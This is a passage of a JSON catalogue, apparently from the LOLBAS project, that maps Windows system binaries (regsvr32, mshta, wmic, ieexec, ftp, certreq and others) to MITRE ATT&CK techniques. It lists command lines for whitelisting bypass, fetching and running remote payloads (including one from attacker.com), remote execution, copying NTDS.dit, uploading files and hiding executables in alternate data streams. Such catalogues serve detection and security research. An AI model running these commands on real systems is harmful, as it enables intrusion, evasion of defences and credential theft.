"jsc.exe scriptfile.js", "Description": "Use jsc.exe to compile javascript code stored in scriptfile.js and output scriptfile.exe.", "Usecase": "Compile attacker code on system. Bypass defensive counter measures.", "Category": "Compile", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "jsc.exe /t:library Library.js", "Description": "Use jsc.exe to compile javascript code stored in Library.js and output Library.dll.", "Usecase": "Compile attacker code on system. Bypass defensive counter measures.", "Category": "Compile", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1024": {"platform": "windows", "cmd": "Regsvr32.exe", "cmd_alias": "Regsvr32", "cmd_desc": "Used by Windows to register dlls", "function": "awl-bypass", "data": [{"Command": "regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll", "Description": "Execute the specified remote .SCT script with scrobj.dll.", "Usecase": "Execute code from remote scriptlet, bypass Application whitelisting", "Category": "AWL bypass", "Privileges": "User", "MitreID": "T1117", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1117", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "regsvr32.exe /s /u /i:file.sct scrobj.dll", "Description": "Execute the specified local .SCT script with scrobj.dll.", "Usecase": "Execute code from scriptlet, bypass Application whitelisting", "Category": "AWL bypass", "Privileges": "User", "MitreID": "T1117", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1117", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1025": {"platform": "windows", "cmd": "Regsvr32.exe", "cmd_alias": "Regsvr32", "cmd_desc": "Used by Windows to register dlls", "function": "execute", "data": [{"Command": "regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll", "Description": "Execute the specified remote .SCT script with scrobj.dll.", "Usecase": "Execute code from remote scriptlet, bypass Application whitelisting", "Category": "Execute", "Privileges": "User", "MitreID": "T1117", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1117", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "regsvr32.exe /s /u /i:file.sct scrobj.dll", "Description": "Execute the specified local .SCT script with scrobj.dll.", "Usecase": "Execute code from scriptlet, bypass Application whitelisting", "Category": "Execute", "Privileges": "User", "MitreID": "T1117", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1117", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1026": {"platform": "windows", "cmd": "Microsoft.Workflow.Compiler.exe", "cmd_alias": "Microsoft", "cmd_desc": "A utility included with .NET that is capable of compiling and executing C# or VB.net code.", "function": "execute", "data": [{"Command": "Microsoft.Workflow.Compiler.exe tests.xml results.xml", "Description": "Compile and execute C# or VB.net code in a XOML file referenced in the test.xml file.", "Usecase": "Compile and run code", "Category": "Execute", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows 10S"}, {"Command": "Microsoft.Workflow.Compiler.exe tests.txt results.txt", "Description": "Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.", "Usecase": "Compile and run code", "Category": "Execute", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows 10S"}]}, "1027": {"platform": "windows", "cmd": "Microsoft.Workflow.Compiler.exe", "cmd_alias": "Microsoft", "cmd_desc": "A utility included with .NET that is capable of compiling and executing C# or VB.net code.", "function": "awl-bypass", "data": [{"Command": "Microsoft.Workflow.Compiler.exe tests.txt results.txt", "Description": "Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file.", "Usecase": "Compile and run code", "Category": "AWL Bypass", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows 10S"}]}, "1028": {"platform": "windows", "cmd": "Verclsid.exe", "cmd_alias": "Verclsid", "cmd_desc": null, "function": "execute", "data": [{"Command": "verclsid.exe /S /C {CLSID}", "Description": "Used to verify a COM object before it is instantiated by Windows Explorer", "Usecase": "Run a com object created in registry to evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10"}]}, "1029": {"platform": "windows", "cmd": "Mshta.exe", "cmd_alias": "Mshta", "cmd_desc": "Used by Windows to execute html applications. (.hta)", "function": "execute", "data": [{"Command": "mshta.exe evilfile.hta", "Description": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.", "Usecase": "Execute code", "Category": "Execute", "Privileges": "User", "MitreID": "T1170", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "mshta.exe vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))", "Description": "Executes VBScript supplied as a command line argument.", "Usecase": "Execute code", "Category": "Execute", "Privileges": "User", "MitreID": "T1170", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "mshta.exe javascript:a=GetObject(\"script:https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Mshta_calc.sct\").Exec();close();", "Description": "Executes JavaScript supplied as a command line argument.", "Usecase": "Execute code", "Category": "Execute", "Privileges": "User", "MitreID": "T1170", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1030": {"platform": "windows", "cmd": "Mshta.exe", "cmd_alias": "Mshta", "cmd_desc": "Used by Windows to execute html applications. (.hta)", "function": "ads", "data": [{"Command": "mshta.exe \"C:\\ads\\file.txt:file.hta\"", "Description": "Opens the target .HTA and executes embedded JavaScript, JScript, or VBScript.", "Usecase": "Execute code hidden in alternate data stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1170", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1170", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10 (Does not work on 1903 and newer)"}]}, "1031": {"platform": "windows", "cmd": "Scriptrunner.exe", "cmd_alias": "Scriptrunner", "cmd_desc": null, "function": "execute", "data": [{"Command": "Scriptrunner.exe -appvscript calc.exe", "Description": "Executes calc.exe", "Usecase": "Execute binary through proxy binary to evade defensive counter measurments", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "ScriptRunner.exe -appvscript \"\\\\fileserver\\calc.cmd\"", "Description": "Executes calc.cmde from remote server", "Usecase": "Execute binary through proxy binary  from external server to evade defensive counter measurments", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1032": {"platform": "windows", "cmd": "Tttracer.exe", "cmd_alias": "Tttracer", "cmd_desc": "Used by Windows 1809 and newer to Debug Time Travel", "function": "execute", "data": [{"Command": "tttracer.exe C:\\windows\\system32\\calc.exe", "Description": "Execute calc using tttracer.exe. Requires administrator privileges", "Usecase": "Spawn process using other binary", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 1809 and newer"}]}, "1033": {"platform": "windows", "cmd": "Tttracer.exe", "cmd_alias": "Tttracer", "cmd_desc": "Used by Windows 1809 and newer to Debug Time Travel", "function": "dump", "data": [{"Command": "TTTracer.exe -dumpFull -attach pid", "Description": "Dumps process using tttracer.exe. Requires administrator privileges", "Usecase": "Dump process by PID", "Category": "Dump", "Privileges": "Administrator", "MitreID": "T1003", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1003", "OperatingSystem": "Windows 10 1809 and newer"}]}, "1034": {"platform": "windows", "cmd": "Extrac32.exe", "cmd_alias": "Extrac32", "cmd_desc": null, "function": "ads", "data": [{"Command": "extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe", "Description": "Extracts the source CAB file into an Alternate Data Stream (ADS) of the target file.", "Usecase": "Extract data from cab file and hide it in an alternate data stream.", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "extrac32 \\\\webdavserver\\webdav\\file.cab c:\\ADS\\file.txt:file.exe", "Description": "Extracts the source CAB file on an unc path into an Alternate Data Stream (ADS) of the target file.", "Usecase": "Extract data from cab file and hide it in an alternate data stream.", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1035": {"platform": "windows", "cmd": "Extrac32.exe", "cmd_alias": "Extrac32", "cmd_desc": null, "function": "download", "data": [{"Command": "extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt", "Description": "Copy the source file to the destination file and overwrite it.", "Usecase": "Download file from UNC/WEBDav", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1036": {"platform": "windows", "cmd": "Extrac32.exe", "cmd_alias": "Extrac32", "cmd_desc": null, "function": "copy", "data": [{"Command": "extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe", "Description": "Command for copying calc.exe to another folder", "Usecase": "Copy file", "Category": "Copy", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1037": {"platform": "windows", "cmd": "Forfiles.exe", "cmd_alias": "Forfiles", "cmd_desc": "Selects and executes a command on a file or set of files. This command is useful for batch processing.", "function": "execute", "data": [{"Command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe", "Description": "Executes calc.exe since there is a match for notepad.exe in the c:\\windows\\System32 folder.", "Usecase": "Use forfiles to start a new process to evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1038": {"platform": "windows", "cmd": "Forfiles.exe", "cmd_alias": "Forfiles", "cmd_desc": "Selects and executes a command on a file or set of files. This command is useful for batch processing.", "function": "ads", "data": [{"Command": "forfiles /p c:\\windows\\system32 /m notepad.exe /c \"c:\\folder\\normal.dll:evil.exe\"", "Description": "Executes the evil.exe Alternate Data Stream (AD) since there is a match for notepad.exe in the c:\\windows\\system32 folder.", "Usecase": "Use forfiles to start a new process from a binary hidden in an alternate data stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1039": {"platform": "windows", "cmd": "Desktopimgdownldr.exe", "cmd_alias": "Desktopimgdownldr", "cmd_desc": "Windows binary used to configure lockscreen/desktop image", "function": "download", "data": [{"Command": "set \"SYSTEMROOT=C:\\Windows\\Temp\" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr", "Description": "Downloads the file and sets it as the computer's lockscreen", "Usecase": "Download arbitrary files from a web server", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/techniques/T1105/", "OperatingSystem": "Windows 10"}]}, "1040": {"platform": "windows", "cmd": "CertReq.exe", "cmd_alias": "CertReq", "cmd_desc": "Used for requesting and managing certificates", "function": "download", "data": [{"Command": "CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt", "Description": "Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory", "Usecase": "Download file from Internet", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1041": {"platform": "windows", "cmd": "CertReq.exe", "cmd_alias": "CertReq", "cmd_desc": "Used for requesting and managing certificates", "function": "upload", "data": [{"Command": "CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal", "Description": "Send the file c:\\windows\\win.ini to the endpoint https://example.org/ via HTTP POST", "Usecase": "Upload", "Category": "Upload", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1042": {"platform": "windows", "cmd": "Gpscript.exe", "cmd_alias": "Gpscript", "cmd_desc": "Used by group policy to process scripts", "function": "execute", "data": [{"Command": "Gpscript /logon", "Description": "Executes logon scripts configured in Group Policy.", "Usecase": "Add local group policy logon script to execute file and hide from defensive counter measures", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "Gpscript /startup", "Description": "Executes startup scripts configured in Group Policy", "Usecase": "Add local group policy logon script to execute file and hide from defensive counter measures", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1216", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1216", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1043": {"platform": "windows", "cmd": "Wmic.exe", "cmd_alias": "Wmic", "cmd_desc": "The WMI command-line (WMIC) utility provides a command-line interface for WMI", "function": "ads", "data": [{"Command": "wmic.exe process call create \"c:\\ads\\file.txt:program.exe\"", "Description": "Execute a .EXE file stored as an Alternate Data Stream (ADS)", "Usecase": "Execute binary file hidden in Alternate data streams to evade defensive counter measures", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1044": {"platform": "windows", "cmd": "Wmic.exe", "cmd_alias": "Wmic", "cmd_desc": "The WMI command-line (WMIC) utility provides a command-line interface for WMI", "function": "execute", "data": [{"Command": "wmic.exe process call create calc", "Description": "Execute calc from wmic", "Usecase": "Execute binary from wmic to evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "wmic.exe process call create \"C:\\Windows\\system32\\reg.exe add \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\osk.exe\\\" /v \\\"Debugger\\\" /t REG_SZ /d \\\"cmd.exe\\\" /f\"", "Description": "Add cmd.exe as a debugger for the osk.exe process. Each time osk.exe is run, cmd.exe will be run as well.", "Usecase": "Execute binary by manipulate the debugger for a program to evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "wmic.exe /node:\"192.168.0.1\" process call create \"evil.exe\"", "Description": "Execute evil.exe on the remote system.", "Usecase": "Execute binary on a remote system", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"at 9:00PM c:\\GoogleUpdate.exe ^> c:\\notGoogleUpdateResults.txt\"", "Description": "Create a scheduled execution of C:\\GoogleUpdate.exe to run at 9pm.", "Usecase": "Execute binary with scheduled task created with wmic on a remote computer", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "wmic.exe /node:REMOTECOMPUTERNAME PROCESS call create \"cmd /c vssadmin create shadow /for=C:\\Windows\\NTDS\\NTDS.dit > c:\\not_the_NTDS.dit\"", "Description": "Create a volume shadow copy of NTDS.dit that can be copied.", "Usecase": "Execute binary on remote system", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "wmic.exe process get brief /format:\"https://raw.githubusercontent.com/LOLBAS-Project/LOLBAS/master/OSBinaries/Payload/Wmic_calc.xsl\"", "Description": "Create a volume shadow copy of NTDS.dit that can be copied.", "Usecase": "Execute binary on remote system", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "wmic.exe process get brief /format:\"\\\\127.0.0.1\\c$\\Tools\\pocremote.xsl\"", "Description": "Executes JScript or VBScript embedded in the target remote XSL stylsheet.", "Usecase": "Execute script from remote system", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1045": {"platform": "windows", "cmd": "Ieexec.exe", "cmd_alias": "Ieexec", "cmd_desc": "The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.", "function": "download", "data": [{"Command": "ieexec.exe http://x.x.x.x:8080/bypass.exe", "Description": "Downloads and executes bypass.exe from the remote server.", "Usecase": "Download and run attacker code from remote location", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1046": {"platform": "windows", "cmd": "Ieexec.exe", "cmd_alias": "Ieexec", "cmd_desc": "The IEExec.exe application is an undocumented Microsoft .NET Framework application that is included with the .NET Framework. You can use the IEExec.exe application as a host to run other managed applications that you start by using a URL.", "function": "execute", "data": [{"Command": "ieexec.exe http://x.x.x.x:8080/bypass.exe", "Description": "Downloads and executes bypass.exe from the remote server.", "Usecase": "Download and run attacker code from remote location", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1047": {"platform": "windows", "cmd": "Mmc.exe", "cmd_alias": "Mmc", "cmd_desc": "Load snap-ins to locally and remotely manage Windows systems", "function": "execute", "data": [{"Command": "mmc.exe -Embedding c:\\path\\to\\test.msc", "Description": "Launch a 'backgrounded' MMC process and invoke a COM payload", "Usecase": "Configure a snap-in to load a COM custom class (CLSID) that has been added to the registry", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 10 (and possibly earlier versions)"}]}, "1048": {"platform": "windows", "cmd": "Diantz.exe", "cmd_alias": "Diantz", "cmd_desc": "Binary that package existing files into a cabinet (.cab) file", "function": "ads", "data": [{"Command": "diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab", "Description": "Compress taget file into a cab file stored in the Alternate Data Stream (ADS) of the target file.", "Usecase": "Hide data compressed into an Alternate Data Stream.", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1."}]}, "1049": {"platform": "windows", "cmd": "Diantz.exe", "cmd_alias": "Diantz", "cmd_desc": "Binary that package existing files into a cabinet (.cab) file", "function": "download", "data": [{"Command": "diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab", "Description": "Download and compress a remote file and store it in a cab file on local machine.", "Usecase": "Download and compress into a cab file.", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019"}]}, "1050": {"platform": "windows", "cmd": "Ftp.exe", "cmd_alias": "Ftp", "cmd_desc": "A binary designed for connecting to FTP servers", "function": "execute", "data": [{"Command": "echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt", "Description": "Executes the commands you put inside the text file.", "Usecase": "Spawn new process using ftp.exe. Ftp.exe runs cmd /C YourCommand", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1051": {"platform": "windows", "cmd": "Ftp.exe", "cmd_alias": "Ftp", "cmd_desc": "A binary designed for connecting to FTP servers", "function": "download", "data": [{"Command": "cmd.exe /c \"@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v\"", "Description": "Download", "Usecase": "Spawn new process using ftp.exe. Ftp.exe downloads the binary.", "Category": "Download", "Privileges": "User", "MitreID": "T1105", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1105", "OperatingSystem": "Windows XP, Windows Vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1052": {"platform": "windows", "cmd": "Wab.exe", "cmd_alias": "Wab", "cmd_desc": "Windows address book manager", "function": "execute", "data": [{"Command": "wab.exe", "Description": "Change HKLM\\Software\\Microsoft\\WAB\\DLLPath and execute DLL of choice", "Usecase": "Execute dll file. Bypass defensive counter measures", "Category": "Execute", "Privileges": "Administrator", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1053": {"platform": "windows", "cmd": "Register-cimprovider.exe", "cmd_alias": "Register-cimprovider", "cmd_desc": "Used to register new wmi providers", "function": "execute", "data": [{"Command": "Register-cimprovider -path \"C:\\folder\\evil.dll\"", "Description": "Load the target .DLL.", "Usecase": "Execute code within dll file", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1054": {"platform": "windows", "cmd": "Msdt.exe", "cmd_alias": "Msdt", "cmd_desc": "Microsoft diagnostics tool", "function": "execute", "data": [{"Command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE", "Description": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.", "Usecase": "Execute code", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1055": {"platform": "windows", "cmd": "Msdt.exe", "cmd_alias": "Msdt", "cmd_desc": "Microsoft diagnostics tool", "function": "awl-bypass", "data": [{"Command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE", "Description": "Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the PCW8E57.xml file.", "Usecase": "Execute code bypass Application whitelisting", "Category": "AWL bypass", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1056": {"platform": "windows", "cmd": "Regedit.exe", "cmd_alias": "Regedit", "cmd_desc": "Used by Windows to manipulate registry", "function": "ads", "data": [{"Command": "regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey", "Description": "Export the target Registry key to the specified .REG file.", "Usecase": "Hide registry data in alternate data stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "regedit C:\\ads\\file.txt:regfile.reg", "Description": "Import the target .REG file into the Registry.", "Usecase": "Import hidden registry data from alternate data stream", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1057": {"platform": "windows", "cmd": "Extexport.exe", "cmd_alias": "Extexport", "cmd_desc": null, "function": "execute", "data": [{"Command": "Extexport.exe c:\\test foo bar", "Description": "Load a DLL located in the c:\\test folder with one of the following names mozcrt19.dll, mozsqlite3.dll, or sqlite.dll", "Usecase": "Execute dll file", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1058": {"platform": "windows", "cmd": "Regini.exe", "cmd_alias": "Regini", "cmd_desc": "Used to manipulate the registry", "function": "ads", "data": [{"Command": "regini.exe newfile.txt:hidden.ini", "Description": "Write registry keys from data inside the Alternate data stream.", "Usecase": "Write to registry", "Category": "ADS", "Privileges": "User", "MitreID": "T1096", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1096", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1059": {"platform": "windows", "cmd": "Odbcconf.exe", "cmd_alias": "Odbcconf", "cmd_desc": "Used in Windows for managing ODBC connections", "function": "execute", "data": [{"Command": "odbcconf -f file.rsp", "Description": "Load DLL specified in target .RSP file. See the Playloads folder for an example .RSP file.", "Usecase": "Execute dll file using technique that can evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "odbcconf /a {REGSVR c:\\test\\test.dll}", "Description": "Execute DllREgisterServer from DLL specified.", "Usecase": "Execute dll file using technique that can evade defensive counter measures", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1060": {"platform": "windows", "cmd": "Atbroker.exe", "cmd_alias": "Atbroker", "cmd_desc": "Helper binary for Assistive Technology (AT)", "function": "execute", "data": [{"Command": "ATBroker.exe /start malware", "Description": "Start a registered Assistive Technology (AT).", "Usecase": "Executes code defined in registry for a new AT. Modifications must be made to the system registry to either register or modify an existing Assistibe Technology (AT) service entry.", "Category": "Execute", "Privileges": "User", "MitreID": "T1218", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1218", "OperatingSystem": "Windows 8, Windows 8.1, Windows 10"}]}, "1061": {"platform": "windows", "cmd": "Dnscmd.exe", "cmd_alias": "Dnscmd", "cmd_desc": "A command-line interface for managing DNS servers", "function": "execute", "data": [{"Command": "dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll", "Description": "Adds a specially crafted DLL as a plug-in of the DNS Service. This command must be run on a DC by a user that is at least a member of the DnsAdmins group. See the reference links for DLL details.", "Usecase": "Remotly inject dll to dns server", "Category": "Execute", "Privileges": "DNS admin", "MitreID": "T1035", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1035", "OperatingSystem": "Windows server"}]}, "1062": {"platform": "windows", "cmd": "Csc.exe", "cmd_alias": "Csc", "cmd_desc": "Binary file used by .NET to compile C# code", "function": "compile", "data": [{"Command": "csc.exe -out:My.exe File.cs", "Description": "Use CSC.EXE to compile C# code stored in File.cs and output the compiled version to My.exe.", "Usecase": "Compile attacker code on system. Bypass defensive counter measures.", "Category": "Compile", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}, {"Command": "csc -target:library File.cs", "Description": "Use CSC.EXE to compile C# code stored in File.cs and output the compiled version to a dll file.", "Usecase": "Compile attacker code on system. Bypass defensive counter measures.", "Category": "Compile", "Privileges": "User", "MitreID": "T1127", "MitreLink": "https://attack.mitre.org/wiki/Technique/T1127", "OperatingSystem": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10"}]}, "1063": {"platform": "windows", "cmd": "Cmstp.exe", "cmd_alias": "Cmstp", 